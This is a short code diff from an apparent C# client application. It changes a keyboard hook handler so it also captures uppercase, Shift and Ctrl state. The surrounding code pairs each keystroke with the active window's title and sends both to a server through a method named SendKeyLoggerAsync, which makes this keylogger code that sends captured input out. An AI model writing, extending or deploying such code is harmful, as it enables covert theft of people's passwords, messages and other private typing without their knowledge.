@@ -56,7 +56,8 @@ namespace CLIENT.ViewModels
                         // Start listening
                         _ = ListenToServerAsync();
 
-                        KeyboardDetector.OnKeyPressed += async (key) =>
+                      
+                        KeyboardDetector.OnKeyPressed += async (key, isUpperCase, isShiftPressed, isCtrlPressed) =>
                         {
                             string windowInfo = WindowDetector.GetActiveWindowInfo();
                             await SendKeyLoggerAsync($"Key: {key}, {windowInfo}");
